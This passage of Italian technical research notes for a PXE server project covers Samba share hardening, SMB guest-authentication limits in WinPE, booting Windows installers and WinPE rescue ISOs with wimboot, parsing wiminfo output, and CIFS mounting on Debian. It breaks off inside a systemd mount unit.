MS Learn (verbatim): "Starting from Windows 10, version 1709 and Windows Server 2019, SMB2 and SMB3 clients no longer allow the following actions by default: Guest account access to a remote server. Fall back to the Guest account after invalid credentials are provided."
"By default, guest credentials can't be used to connect to a remote share in Windows 10 Enterprise, Windows 10 Pro for Workstations, and Windows 10 Education even if requested by the remote server." "Windows 10 Home and Pro editions still allow the use of guest authentication by default, as they did previously." "In Windows 11 Pro Insider Preview build 25267, and all subsequent builds, guest credentials can't be used to connect to a remote share by default, even if requested by the remote server." "SMB signing is required by default for Windows 11, version 24H2, Windows Server 2025, and later builds which results in compatibility issues with guest authentication if signing doesn't succeed." "Guest logons don't support standard security features such as SMB signing and SMB encryption even if the SMB client is set to allow guest logons."
Errore lato client: "System error 1272 has occurred. You can't access this shared folder because your organization's security policies block unauthenticated guest access..." (evento 31017 RejectedInsecureGuestAuth).
Chiave: HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters\AllowInsecureGuestAuth (REG_DWORD, 0 = rifiuta guest, default). Unattend: Microsoft-Windows-WorkstationService/AllowInsecureGuestAuth, pass 'generalize' (quindi NON impostabile via unattend nel pass windowsPE).

WinPE: il boot.wim delle ISO 11 (e 10 Ent/Edu) contiene lo stesso client SMB (LanmanWorkstation) del SKU client con AllowInsecureGuestAuth non impostato (=0): in WinPE 'net use \\srv\share' guest fallisce con 1272; la community lo aggira con `reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /t REG_DWORD /d 1 /f` in startnet/winpeshl (WinPE gira come SYSTEM, quindi reg add funziona) MA su 24H2/Server 2025 servirebbe anche disabilitare RequireSecuritySignature (signing obbligatorio non compatibile con guest). [Confidenza media: comportamento in WinPE dedotto da doc MS + report utenti, non testato qui.]

=> Per Pixio: share 'pxe' con utente dedicato (es. 'pxe' con password impostata in GUI, default 'pxe'), 'guest ok = no', e nel .cmd 'net use S: \\10.10.0.254\pxe <pass> /user:pxe'. Con utente reale: NTLMv2 (Samba default 'ntlm auth = ntlmv2-only') + SMB2/3 signing (Samba: "For the SMB2 protocol, by design, signing cannot be disabled") => compatibile con 24H2 signing-required. SMB1 non serve (WinPE moderno non lo ha; Samba default 'server min protocol = SMB2_02').
```

### 3a. smb.conf minimo e sicuro per la share 'pxe' (read-only, utente dedicato)

*Fonte:* man smb.conf (samba 2:4.22.10+dfsg-0+deb13u2) ; testparm -s -v su questa macchina ; /etc/samba/smb.conf Debian — *confidenza:* alta

```
Default effettivi su Debian 13 / Samba 4.22.10 (testparm -s -v): server min protocol = SMB2_02, server max protocol = SMB3, server signing = default, server smb encrypt = default, ntlm auth = ntlmv2-only, map to guest = Bad User (impostato da /etc/samba/smb.conf Debian; il default Samba è Never), guest account = nobody, wide links = No, allow insecure wide links = No, follow symlinks = Yes, smb1 unix extensions = Yes, smb3 unix extensions = No.
man smb.conf: "read only ... Default: read only = yes"; "guest ok ... Default: guest ok = no"; "map to guest ... Bad User - Means user logins with an invalid password are rejected, unless the username does not exist, in which case it is treated as a guest login and mapped into the guest account"; "wide links: This parameter controls whether or not links in the UNIX file system may be followed by the server. Links that point to areas within the directory tree exported by the server are always allowed; this parameter controls access only to areas that are outside the directory tree being exported ... Default: wide links = no"; "allow insecure wide links ... It is not recommended to enable this option"; "follow symlinks ... This option is enabled (i.e. smbd will follow symbolic links) by default."

/etc/samba/smb.conf generato da Pixio (solo se l'opzione 'installazione Windows' è attiva; usare un file dedicato incluso o sostituire quello Debian):

[global]
   server role = standalone server
   workgroup = WORKGROUP
   server string = Pixio PXE
   netbios name = PIXIO
   disable netbios = yes
   smb ports = 445
   server min protocol = SMB2_02
   map to guest = Never
   ntlm auth = ntlmv2-only
   restrict anonymous = 2
   interfaces = 10.10.0.254/23 lo
   bind interfaces only = yes
   hosts allow = 10.10.0.0/23 127.0.0.1
   load printers = no
   printing = bsd
   printcap name = /dev/null
   disable spoolss = yes
   logging = file
   log file = /var/log/samba/log.%m
   max log size = 1000
   usershare max shares = 0

[pxe]
   comment = Pixio - ISO montate (sola lettura)
   path = /srv/pixio/http/iso
   read only = yes
   browseable = yes
   guest ok = no
   valid users = pxe
   follow symlinks = yes
   wide links = no
   hide dot files = yes

Note:
- Le directory /srv/pixio/http/iso/<slug> sono mount point iso9660/udf (non symlink): 'wide links'/'allow insecure wide links' NON servono. Non includere nella share /srv/pixio/http/isofile (symlink verso il mount CIFS = fuori dalla share => bloccati da wide links = no, correttamente).
- Permessi: i loop mount iso9660/udf espongono i file come root con r-x per tutti (mount -o ro,loop; per forzare: iso9660 'mode=0444,dmode=0555', udf 'uid=..,gid=..'): l'utente 'pxe' (non root) li legge come 'other'. Se il mount è UDF con permessi restrittivi, montare con uid/gid/umask espliciti.
- Con la share 'pixio-iso' locale in scrittura (libreria) usare una sezione separata con utente diverso e 'read only = no'.
- Alternativa guest (solo per client NON Windows, es. per test Linux): '[global] map to guest = Bad User' + '[pxe] guest ok = yes' (+ 'guest only = yes'); da NON proporre per WinPE (vedi 2d).
- Verifica: testparm -s; smbclient -L 127.0.0.1 -U pxe%pxe; smbclient //127.0.0.1/pxe -U pxe%pxe -c 'ls'.
```

### 3b. Creazione utente Samba non interattivo

*Fonte:* man smbpasswd ; man pdbedit (samba 4.22.10) — *confidenza:* alta

```
man smbpasswd: "-a  This option specifies that the username following should be added to the local smbpasswd file ... Note that the default passdb backends require the user to already exist in the system password file (usually /etc/passwd), else the request to add the user will fail. This option is only available when running smbpasswd as root."
"-s  This option causes smbpasswd to be silent (i.e. not issue prompts) and to read its old and new passwords from standard input, rather than from /dev/tty ... This option is to aid people writing scripts to drive smbpasswd"
man pdbedit: "-t|--password-from-stdin  This option causes pdbedit to read the password from standard input ... The password has to be submitted twice and terminated by a newline each."

Comandi (root, idempotenti):
  # utente di sistema senza login
  getent passwd pxe >/dev/null || useradd --system --no-create-home --home-dir /nonexistent --shell /usr/sbin/nologin --user-group pxe
  # (equivalente Debian) adduser --system --no-create-home --home /nonexistent --shell /usr/sbin/nologin --group pxe
  # password Samba da stdin (due righe: nuova password ripetuta)
  printf '%s\n%s\n' "$PW" "$PW" | smbpasswd -a -s pxe
  smbpasswd -e pxe          # assicura l'account abilitato (-a lo crea già abilitato)
  # alternativa: printf '%s\n%s\n' "$PW" "$PW" | pdbedit -a -u pxe -t
  # cambio password successivo: printf '%s\n%s\n' "$PW" "$PW" | smbpasswd -s pxe   (da root non chiede la vecchia)
  # rimozione: smbpasswd -x pxe
  # verifica: pdbedit -L ; smbclient //127.0.0.1/pxe -U pxe%"$PW" -c ls
Nota: smbpasswd -a come root scrive direttamente nel passdb (tdbsam in /var/lib/samba/private/passdb.tdb) anche con smbd fermo. Non mettere la password nella riga di comando (visibile in ps): usare stdin come sopra. Le password Samba sono memorizzate come hash NT: non usare password 'importanti'; l'utente serve solo a leggere ISO in LAN.
```

### 4. Windows 11 setup da share: funziona, caveat (UEFI/GPT, TPM bypass, RAM, reboot)

*Fonte:* https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/windows-setup-installing-using-the-mbr-or-gpt-partition-style ; https://ipxe.org/howto/winpe ; https://github.com/QurtiDev/Win11-LabConfig-Bypass ; https://www.elevenforum.com/t/install-windows-11-v25h2-on-an-unsupported-pc-hardware-avoiding-error-message-this-pc-cant-run-windows-11.42938/ ; https://www.theregister.com/2024/08/19/windows_11_loophole_closed/ — *confidenza:* media

```
Funziona? SÌ: lanciare S:\<slug>\setup.exe (root della ISO montata in loop e ricondivisa) da WinPE index 2 è il flusso documentato da ipxe.org ("connect to a standard Windows file server to install a full version of Windows to the local hard disk"); setup.exe trova sources\install.wim o sources\install.esd (e install*.swm) relativi alla propria directory. Vale per Windows 10, 11 (incl. 24H2/25H2, nuovo setup) e Server 2019/2022/2025 (stesso layout).

Caveat:
(a) Firmware/partizionamento - MS Learn: "Windows cannot be installed to this disk. The selected disk is not of the GPT partition style, it's because your PC is booted in UEFI mode, but your hard drive is not configured for UEFI mode." ... "Windows detects that the PC was booted into UEFI mode, and reformats the drive using the GPT drive format". WinPE via wimboot parte nella stessa modalità del PXE (ipxe.efi -> UEFI -> GPT; undionly.kpxe -> BIOS -> MBR): l'utente deve fare PXE nella modalità firmware in cui vuole Windows installato; dischi con partizioni esistenti dell'altro stile vanno cancellati (diskpart: clean; convert gpt).
(b) Dopo la prima fase (copia file) il PC si riavvia e DEVE avviarsi dal disco locale: il menu iPXE deve avere timeout con default 'boot locale' (exit / sanboot --no-describe --drive 0x80) oppure l'utente cambia l'ordine di boot; altrimenti riparte l'installer.
(c) RAM: boot.wim (~500-900 MB) in RAM + Setup: minimo pratico 2 GB, 4 GB consigliati (Win11 richiede 4 GB comunque).
(d) Bypass requisiti Win11 (opzionale, non ufficiale): chiavi interne 'LabConfig' lette da setup nel pass WinPE. Nel install.cmd prima di setup.exe:
   reg add "HKLM\SYSTEM\Setup\LabConfig" /v BypassTPMCheck /t REG_DWORD /d 1 /f
   reg add "HKLM\SYSTEM\Setup\LabConfig" /v BypassSecureBootCheck /t REG_DWORD /d 1 /f
   reg add "HKLM\SYSTEM\Setup\LabConfig" /v BypassRAMCheck /t REG_DWORD /d 1 /f
   reg add "HKLM\SYSTEM\Setup\LabConfig" /v BypassCPUCheck /t REG_DWORD /d 1 /f
   reg add "HKLM\SYSTEM\Setup\LabConfig" /v BypassStorageCheck /t REG_DWORD /d 1 /f
   Funziona per clean install da WinPE anche con 24H2/25H2 secondo i thread community (elevenforum), perché il check gira nel WinPE avviato da noi. Alternativa 'setup.exe /product server' (setupprep.exe): funzionava su 24H2 GA, chiuso nelle build Canary 27686+ -> inaffidabile. Nessuna fonte Microsoft ufficiale: mostrare come opzione 'non supportata'.
(e) Secure Boot: con SB attivo iPXE non parte (ipxe.efi non firmato) -> il bypass SB check è comunque coerente; wimboot supporterebbe SB.
(f) Non serve HTTP per install.wim: solo boot.wim via HTTP; install.wim via SMB. Se l'ISO è su CIFS remoto (share Windows), il percorso è CIFS -> loop -> smbd -> WinPE: funziona ma è lento; consigliare 'copia locale' per Windows.
(g) unattend (autounattend.xml) opzionale: setup.exe /unattend:S:\pixio\<slug>.xml - non richiesto.
```

### 5a. Hiren's BootCD PE: layout e ricetta

*Fonte:* https://www.hirensbootcd.org/howtos/ ; https://github.com/orgs/netbootxyz/discussions/46 ; https://forums.fogproject.org/topic/12939/adding-hiren-s-bootcd-pe-to-advanced-menu — *confidenza:* media

```
Layout ISO HBCD_PE_x64.iso (Windows 11 PE based nelle versioni recenti): bootmgr (nel thread netboot.xyz referenziato come 'BOOTMGR' maiuscolo: il case reale va rilevato), bootmgr.efi, boot/bcd, boot/boot.sdi, efi/boot/bootx64.efi, sources/boot.wim (2.5-3 GB: TUTTI i programmi sono dentro il wim), HBCD_PE.ini (sito ufficiale: "HBCD_PE.ini resides in the root directory of the USB flash drive" - serve solo a personalizzazioni tipo layout tastiera: 'Wpeutil.exe SetKeyboardLayout'; opzionale). Il file .wim da usare è /sources/boot.wim (NON esiste un /HBCD_PE.wim).
RAM (howtos ufficiali): con <= 2 GB usare la vecchia HBCD_PE_x64_v101.iso; 2-4 GB: ridurre il ramdisk X: a 3 GB; errore 0xc0000017 = RAM insufficiente per il ramdisk. Via wimboot il boot.wim intero sta in RAM: richiedere >= 4 GB (meglio 6-8).
Script FOG testato (v1.0.1):
  kernel ${tftp-path}/wimboot gui
  imgfetch --name BCD http://${fog-ip}/hbcd/Boot/BCD BCD
  imgfetch --name boot.sdi http://${fog-ip}/hbcd/Boot/boot.sdi boot.sdi
  imgfetch --name boot.wim http://${fog-ip}/hbcd/sources/boot.wim boot.wim
  boot || goto MENU
Script netboot.xyz discussion #46 (FM1337, 2023):
  kernel https://boot.netboot.xyz/wimboot
  initrd -n bootmgr ${base-url}/BOOTMGR bootmgr ||
  initrd -n bootmgr.efi ${base-url}/bootmgr.efi bootmgr.efi ||
  initrd -n bcd ${base-url}/boot/bcd bcd||
  initrd -n boot.sdi ${base-url}/boot/boot.sdi boot.sdi||
  initrd -n boot.wim ${base-url}/sources/boot.wim boot.wim
  boot
Ricetta Pixio (uguale a Windows installer ma senza winpeshl/install.cmd e senza index):
  kernel http://${srv}/pxe/boot/wimboot quiet
  initrd http://${srv}/pxe/iso/${slug}/boot/bcd BCD ||
  initrd http://${srv}/pxe/iso/${slug}/boot/boot.sdi boot.sdi ||
  initrd -n boot.wim http://${srv}/pxe/iso/${slug}/sources/boot.wim boot.wim
  boot
Funziona BIOS e UEFI (wimboot ibrido). Non serve Samba. Rilevamento: presenza di HBCD_PE.ini in root e/o label volume 'HBCD_PE_x64' (blkid -s LABEL -o value file.iso) + sources/boot.wim senza install.wim.
```

### 5b. Sergei Strelec WinPE: layout e ricetta (parziale)

*Fonte:* https://github.com/ipxe/ipxe/discussions/352 ; https://github.com/ipxe/ipxe/discussions/980 ; https://forums.fogproject.org/topic/16919/how-to-use-sergie-strelec-over-fog — *confidenza:* media

```
Layout ISO: cartella /SSTR/ con i wim (strelec10x64Eng.wim / strelec11x64.wim / strelec10x86.wim ... - fino a 4 wim per ISO), SSTR/BCD, SSTR/boot.sdi, SSTR/bootmgr, SSTR/bootmgr64.exe, SSTR/bootx64.efi, più cartelle programmi ESTERNE al wim (i tool 'portable' stanno sul supporto: Strelec monta il supporto e cerca la cartella SSTR).
Script ipxe discussion #352 (verbatim):
 UEFI:
  kernel SSTR/wimboot || goto failed
  initrd --name network.cmd SSTR/network.cmd network.cmd || goto failed
  initrd --name bootx64.efi SSTR/bootx64.efi bootx64.efi || goto failed
  initrd --name bootmgr SSTR/bootmgr bootmgr || goto failed
  initrd --name BCD SSTR/BCD BCD || goto failed
  initrd --name boot.sdi SSTR/boot.sdi boot.sdi || goto failed
  initrd --name boot.wim SSTR/strelec10x64Eng.wim strelec10x64Eng.wim || goto failed
  boot || goto failed
 BIOS 64:
  kernel SSTR/wimboot || goto failed
  initrd --name network.cmd SSTR/network.cmd network.cmd || goto failed
  initrd --name bootx64.efi SSTR/bootx64.efi bootx64.efi || goto failed
  initrd --name bootmgr.exe SSTR/bootmgr64.exe bootmgr.exe || goto failed
  initrd --name BCD SSTR/BCD BCD || goto failed
  initrd --name boot.sdi SSTR/boot.sdi boot.sdi || goto failed
  initrd --name boot.wim SSTR/strelec10x64Eng.wim boot.wim || goto failed
(l'utente monta poi via SMB il resto della ISO da network.cmd per avere i programmi).
ipxe discussion #980 (maintainer): "wimboot can be used to boot .wim files" ma "Programs located outside the WIM fail to execute", wim ~4.5 GB -> RAM.
Ricetta Pixio: tipo 'winpe' generico: wimboot + SSTR/BCD + SSTR/boot.sdi + il .wim scelto (menu con un item per ogni SSTR/*.wim, nome = filename); avviso GUI: 'Strelec: solo il PE di base; i programmi esterni al wim non sono disponibili via rete (usare share pxe + net use manuale, o USB)'. I nomi dei wim cambiano tra versioni: enumerare *.wim in SSTR/ invece di hardcodare.
```

### 5c. Medicat USB: non è una ISO, Mini Windows con programmi esterni

*Fonte:* https://easy2boot.xyz/create-your-website-with-blocks/add-payload-files/winpe-isos-winbuilder-medicat-gandalf-etc/ — *confidenza:* media

```
Medicat è distribuito come immagine USB Ventoy (.img/.zip), non come ISO unica. Il WinPE è '\Boot_an_Operating_System\[UEFI]_Mini_Windows_10.iso' (versioni vecchie) o '\Live_Operating_Systems\Mini_Windows\Mini_Windows_10.wim' (versioni recenti). Easy2Boot: "The Mini_Windows_10.iso only contains boot files and the boot.wim file"; per farlo funzionare servono anche Start.exe, CdUsb.Y, autorun.cmd e le cartelle PortableApps, Programs, System sulla root del supporto (il PE cerca il marker CdUsb.Y). Via wimboot ottieni solo il PE nudo (desktop Win10 PE senza tool).
Ricetta Pixio: se l'utente carica Mini_Windows_10.iso -> tipo 'winpe' generico (bootmgr + sources/boot.wim); se carica il .wim direttamente (la libreria accetta .wim?) -> `kernel wimboot; initrd -n boot.wim URL boot.wim; boot`. Avviso in GUI. Le altre voci Medicat (Linux) sono ISO separate rilevabili con le ricette Linux.
```

### 6a. Rilevamento tipo ISO Windows (installer vs WinPE tool)

*Fonte:* Layout ISO da ipxe.org/howto/winpe, netbootxyz discussion #46, ipxe discussion #352, easy2boot.xyz; heuristics proposte — *confidenza:* media

```
Regole (tutte case-insensitive sui nomi, perché i loop mount Linux sono case-sensitive e le ISO di terze parti usano case misto; le ISO Microsoft sono in minuscolo):
- windows-install: esiste sources/install.wim OPPURE sources/install.esd OPPURE sources/install*.swm (split), E sources/boot.wim, E (bootmgr OPPURE efi/boot/bootx64.efi OPPURE efi/microsoft/boot/bcd). Tipicamente anche setup.exe e autorun.inf in root; boot/bcd + boot/boot.sdi presenti. Server: identico (distinguere con wiminfo: INSTALLATIONTYPE=Server/Server Core, EDITIONID=ServerStandard/ServerDatacenter...).
- winpe-tool: (bootmgr OPPURE bootmgr.efi OPPURE efi/boot/bootx64.efi) E almeno un *.wim (sources/boot.wim, SSTR/*.wim, o qualunque .wim < 3 livelli) E NESSUN sources/install.{wim,esd,swm}. Sottotipi: 'hirens' se root/HBCD_PE.ini o label 'HBCD_PE*'; 'strelec' se dir root/SSTR; 'medicat' se label contiene 'MEDICAT' o esiste CdUsb.Y (confidenza bassa sul label); altrimenti 'winpe-generico'.
- Se ci sono più .wim: un item di menu per ciascuno (nome = NAME/DISPLAYNAME da wiminfo).
- BCD/boot.sdi: cercare boot/bcd + boot/boot.sdi; per Strelec SSTR/BCD + SSTR/boot.sdi; se assenti, ometterli (wimboot li estrae dal wim: \Windows\Boot\DVD\PCAT|EFI\BCD e boot.sdi).
- Label ISO: blkid -o value -s LABEL <file.iso> (o isoinfo -d -i file.iso | grep 'Volume id'); es. Microsoft: 'CCCOMA_X64FRE_EN-US_DV9', 'CPBA_X64FRE_IT-IT_DV9', 'SSS_X64FREE_...' (Server).
- Python: os.scandir sulla root del mount e dict lower()->nome reale per risolvere i path (funzione find_ci(root, 'sources/boot.wim') -> path reale o None).
```

### 6b. wiminfo (wimtools 1.14.4, installato): comandi e output parsabile

*Fonte:* man wiminfo (wimlib 1.14.4) ; https://raw.githubusercontent.com/ebiggers/wimlib/master/src/xml.c ; test locale con wimcapture/wiminfo ; https://gist.github.com/tkisason/72adc9f1d107ee52b227a99f4ec53a7d — *confidenza:* alta

```
man wiminfo: "wiminfo WIMFILE [IMAGE [NEW_NAME [NEW_DESC]]] [OPTION...]" ; "--xml  Extract the WIM's raw XML document to standard output." ; "--extract-xml=FILE" ; "--header  Show detailed information from the WIM header." Funziona anche su install.esd (LZMS/solid) e su file su CIFS/loop (legge solo header + XML in coda al file: veloce).

Output testuale (formato reale generato qui con un wim di prova; le stringhe di campo sono quelle di wimlib src/xml.c):
$ wiminfo boot.wim
WIM Information:
----------------
Path:           boot.wim
GUID:           0x...
Version:        68864
Image Count:    2
Compression:    LZX
Chunk Size:     32768 bytes
Part Number:    1/1
Boot Index:     2
Size:           ... bytes
Attributes:     Relative path junction

Available Images:
-----------------
Index:                  1
Name:                   Microsoft Windows PE (x64)
Description:            Microsoft Windows PE (x64)
Display Name:           ...
Directory Count:        ...
File Count:             ...
Total Bytes:            ...
Hard Link Bytes:        ...
Creation Time:          ...
Last Modification Time: ...
Architecture:           x86_64
Product Name:           Microsoft® Windows® Operating System
Edition ID:             WindowsPE
Installation Type:      WindowsPE
HAL:                    ...
Product Type:           WinNT
Product Suite:          Terminal Server
Languages:              en-US
Default Language:       en-US
System Root:            WINDOWS
Major Version:          10
Minor Version:          0
Build:                  26100
Service Pack Build:     ...
Service Pack Level:     0
Flags:                  ... (install.wim: es. 'Professional')
WIMBoot compatible:     no

Index:                  2
Name:                   Microsoft Windows Setup (x64)
...
(Campi stampati solo se presenti nell'XML: 'Display Name', 'Architecture'... - src/xml.c: tprintf("Architecture:           %s"), "Product Name:", "Edition ID:", "Installation Type:", "HAL:", "Product Type:", "Product Suite:", "Languages:", "Default Language:", "System Root:", "Major Version:", "Minor Version:", "Build:", "Service Pack Build:", "Service Pack Level:", "Flags:", "WIMBoot compatible:". Esempio reale install.wim Win11 (gist): Name/Display Name 'Windows 11 Pro', Architecture x86_64, Build 26100, Edition ID Professional, Flags Professional, Boot Index 0.)
Mapping ARCH (xml.c): 0=x86, 5=ARM, 6=ia64, 9=x86_64, 12=ARM64.

Parsing consigliato (XML, robusto): l'output di --xml è UTF-16LE con BOM (verificato: `wiminfo f.wim --xml | iconv -f UTF-16LE -t UTF-8`).

import subprocess, xml.etree.ElementTree as ET
def wim_images(path):
    raw = subprocess.run(["wiminfo", path, "--xml"], capture_output=True, check=True, timeout=120).stdout
    root = ET.fromstring(raw.decode("utf-16-le").lstrip("﻿"))
    out = []
    for img in root.findall("IMAGE"):
        g = lambda p: (img.findtext(p) or "").strip()
        out.append({
            "index": int(img.get("INDEX")),
            "name": g("NAME"), "display_name": g("DISPLAYNAME"), "description": g("DESCRIPTION"),
            "flags": g("FLAGS"),                       # es. Professional, Core, ServerStandard
            "arch": {"0":"x86","9":"x86_64","12":"ARM64","5":"ARM"}.get(g("WINDOWS/ARCH"), g("WINDOWS/ARCH")),
            "edition": g("WINDOWS/EDITIONID"),         # Professional, Core, Enterprise, ServerStandard, WindowsPE
            "install_type": g("WINDOWS/INSTALLATIONTYPE"),  # Client, Server, Server Core, WindowsPE
            "product": g("WINDOWS/PRODUCTNAME"),
            "major": g("WINDOWS/VERSION/MAJOR"), "minor": g("WINDOWS/VERSION/MINOR"),
            "build": g("WINDOWS/VERSION/BUILD"), "spbuild": g("WINDOWS/VERSION/SPBUILD"),
            "lang": g("WINDOWS/LANGUAGES/DEFAULT"),
            "langs": [l.text for l in img.findall("WINDOWS/LANGUAGES/LANGUAGE")],
            "bytes": int(g("TOTALBYTES") or 0),
        })
    return out
# Boot index: `wiminfo file.wim --header` o dal testo 'Boot Index:' (non è nell'XML)

Versione da build: 10240..19045 -> Windows 10 (19041/19042/19043/19044/19045 = 2004/20H2/21H1/21H2/22H2); 22000 -> 11 21H2; 22621 -> 11 22H2; 22631 -> 11 23H2; 26100 -> 11 24H2 / Server 2025; 26200 -> 11 25H2; 17763 -> 10 1809 / Server 2019; 20348 -> Server 2022; 14393 -> 1607 / Server 2016. Poiché client e server condividono build, usare INSTALLATIONTYPE/EDITIONID/PRODUCTNAME per 'Server'. Elenco edizioni = lista DISPLAYNAME (o NAME) delle IMAGE di install.wim/esd; per boot.wim mostrare solo 'WinPE x64 build N'. Per split (install*.swm) usare il primo .swm.
```

### Trappole

- wimboot: il pacchetto Debian 'ipxe' NON include wimboot; scaricare https://github.com/ipxe/wimboot/releases/latest/download/wimboot (v2.9.0+ obbligatorio per Win11 24H2/25H2 e Server 2025: boot.stl / bootmgfw_EX.efi). Un solo file per BIOS+UEFI x64; wimboot.i386 per UEFI ia32.
- Nomi file: wimboot confronta case-insensitive (strcasecmp/wcscasecmp), ma nginx su loop mount Linux è case-sensitive: lo scanner deve risolvere i path della ISO in modo case-insensitive e usare il case reale negli URL (Hiren's usa 'BOOTMGR' maiuscolo in alcuni script; ISO Microsoft in minuscolo).
- Guest SMB da WinPE non funziona (Win11 Pro >= build 25267, 24H2 richiede signing incompatibile con guest, errore 1272): usare SEMPRE utente+password Samba ('net use S: \\ip\pxe PASS /user:pxe'), non 'map to guest'.
- Con winpeshl.ini presente startnet.cmd non parte: install.cmd deve chiamare wpeinit per inizializzare la rete; attendere DHCP con loop ping; 'timeout.exe' potrebbe mancare in WinPE (usare ping come sleep).
- boot.wim Boot Index = 2 (Setup); index 1 non ha X:\setup.exe ma per noi è irrilevante perché lanciamo S:\<slug>\setup.exe; comunque usare index=2 (default) per coerenza.
- Modalità firmware: WinPE eredita BIOS/UEFI dal PXE -> Windows installa MBR o GPT di conseguenza; il disco deve essere coerente (altrimenti 'selected disk is not of the GPT partition style'). Dopo il primo reboot il PC deve avviarsi dal disco locale: default del menu iPXE = boot locale con timeout.
- Secure Boot deve essere OFF per far partire ipxe.efi (non firmato), anche se wimboot supporterebbe SB.
- RAM: boot.wim intero in RAM (installer 0.5-0.9 GB; Hiren's ~3 GB; Strelec ~4.5 GB): richiedere >= 4 GB per i WinPE tool, >= 2 GB per installer.
- Share Samba: esporre SOLO /srv/pixio/http/iso (mount point iso9660/udf, non symlink); non includere /srv/pixio/http/isofile (symlink verso CIFS -> bloccati da wide links=no). Controllare i permessi UDF (uid/gid/umask) così che l'utente 'pxe' legga i file.
- wiminfo --xml produce UTF-16LE con BOM: decodificare prima del parsing; il Boot Index NON è nell'XML (usare output testuale o --header).
- Strelec e Medicat: i programmi sono fuori dal wim -> via wimboot si ottiene solo il PE base; Hiren's invece è completo dentro sources/boot.wim.
- TPM/CPU bypass LabConfig e 'setup.exe /product server' non sono ufficiali; il secondo è già stato chiuso in build Canary: offrire solo LabConfig come opzione 'non supportata'.
- Non hardcodare i nomi dei wim Strelec (cambiano per versione/lingua): enumerare SSTR/*.wim.

### Domande aperte

- Case esatto dei nomi file nelle ISO Microsoft montate in loop (udf) e in Hiren's/Strelec: dedotto da fonti secondarie (minuscolo per MS), non verificato su una ISO reale in questa sessione (nessuna ISO Windows sulla macchina): lo scanner deve comunque essere case-insensitive.
- Comportamento esatto del WinPE 24H2 con guest + AllowInsecureGuestAuth=1 (servirebbe anche RequireSecuritySignature=0?): non testato; irrilevante se si usa l'utente dedicato.
- Se winpeshl.exe lancia direttamente un .cmd da [LaunchApps] in tutte le versioni (ipxe.org e netboot.xyz usano "install.bat" nudo con successo); in caso di dubbio usare la forma 'cmd.exe, /c ...'. Da testare in QEMU (TCG, lento) con un boot.wim reale.
- Efficacia del bypass LabConfig con le ISO 25H2 più recenti: report community positivi, nessuna garanzia.
- Hiren's: se HBCD_PE.ini è presente anche nella root della ISO (sul sito è citato per la root della USB): utile solo come marker di rilevamento; in alternativa usare la label del volume.
- Medicat: label del volume dell'ISO 'Mini Windows 10' non verificata; rilevamento come 'winpe generico' è comunque sufficiente.

## Montaggio robusto share SMB via CIFS su Debian 13 (systemd .mount/.automount), test connessione con smbclient, loop-mount ISO da CIFS, serving via nginx (sendfile/Range/SSE), permessi www-data, rilevamento cambi senza inotify

Tutto verificato empiricamente su questa macchina (Debian 13, kernel 6.12.107, cifs.ko 2.51, cifs-utils 7.4, samba/smbclient 4.22.10, nginx 1.26.3 con --with-threads, systemd 257) usando uno smbd temporaneo su 127.0.0.1:4455 con config in scratchpad, un ISO di test da 40 MB, un nginx temporaneo su :8099 e un backend SSE python; nessun file di sistema modificato (creato e poi rimosso l'utente locale 'pixiotest' necessario a smbpasswd; loop device e mount temporanei tutti rimossi).
Risultati chiave: (1) mount CIFS ro con credentials file funziona SOLO se il file è "username=val" senza spazi attorno a '=' (con spazi mount.cifs fallisce EACCES, smbclient -A invece li accetta); vers=3.1.1 negoziato (Dialect 0x311), rsize/wsize 4 MiB di default. (2) 'noperm' disabilita i controlli di permesso lato client: con file_mode=0640,gid=www-data anche 'nobody' legge; senza noperm i mode bit vengono rispettati → per far leggere www-data basta gid=www-data,file_mode=0640,dir_mode=0750 (o 0444/0555) senza noperm. (3) mount -o loop,ro di un .iso su CIFS funziona con cache=strict (default) e anche con cache=none; DIO off di default; losetup --direct-io=on accettato ma inutile; md5 corretti; il loop iso9660 viene letto da www-data. (4) Caduta rete: con server che chiude la connessione (kill) le letture falliscono in ~10 s (EHOSTDOWN 112) sul CIFS e ~20 s sul loop (I/O error → iso9660 restituisce ENOENT e RESTA rotto anche dopo il ritorno del server: il mount CIFS si riconnette da solo, il loop va rimontato con umount -l + mount). Con server "muto" (TCP vivo, SIGSTOP) i processi restano bloccati in D >100-280 s nonostante soft/echo_interval=15; umount -l ritorna subito in entrambi i casi; mount verso host irraggiungibile fallisce in 10 s (rc 32, errno 115), verso server muto in 43 s (errno 112). (5) nginx: sendfile su CIFS e su loop iso9660 funziona (md5 ok, Range 206 ok anche a blocchi di 512 B come fa iPXE httpblock.c); 'aio threads' ok; 'directio' su loop iso9660 genera [alert] fcntl(O_DIRECT) EINVAL a ogni richiesta (contenuto comunque corretto) → NON usare directio; SSE via proxy con proxy_buffering off arriva in tempo reale (1 evento/s). (6) inotify non funziona su CIFS: polling con os.scandir; con actimeo=30 un file nuovo è apparso dopo ~38 s → usare acdirmax=5 (o actimeo basso) per scan più reattivi. (7) smbclient -L ignora -p (usa 445) mentre //host/share -p lo rispetta; 'recurse ON; ls' elenca ricorsivamente, ma 'ls *.iso' con recurse non scende nelle sottocartelle (filtrare lato client).

### 1a. /etc/pixio/smb.cred — formato (NO spazi attorno a '=', chmod 600)

*Fonte:* man -P cat mount.cifs (cifs-utils 7.4) + test empirico su questa macchina — *confidenza:* alta

```
# /etc/pixio/smb.cred  (chmod 0600 root:root)
username=pixiouser
password=Segreto,con,virgole
domain=MIODOMINIO

# man mount.cifs: "credentials=filename ... The format of the file is:
#    username=value / password=value / password2=value / domain=value"
# VERIFICATO: con 'username = value' (spazi) mount.cifs fallisce: mount error(13): Permission denied
#            smbclient -A invece accetta sia con che senza spazi -> usare SEMPRE il formato senza spazi (vale per entrambi)
# La password può contenere ',' solo se passata via file/env, non con -o password= (man mount.cifs).
```

### 1b. Unit native: srv-pixio-iso.mount + srv-pixio-iso.automount (generate dalla GUI)

*Fonte:* man systemd.mount(5)/systemd.automount(5) (systemd 257), man mount.cifs(8), systemd-analyze verify e mount --verbose su questa macchina — *confidenza:* alta

```
# /etc/systemd/system/srv-pixio-iso.mount   (nome = systemd-escape -p --suffix=mount /srv/pixio/iso)
[Unit]
Description=Pixio: share SMB delle ISO (//fileserver/ISO Library/PXE)
Documentation=man:mount.cifs(8) man:systemd.mount(5)
After=network-online.target
Wants=network-online.target
ConditionPathExists=/etc/pixio/smb.cred

[Mount]
What=//fileserver/ISO Library/PXE
Where=/srv/pixio/iso
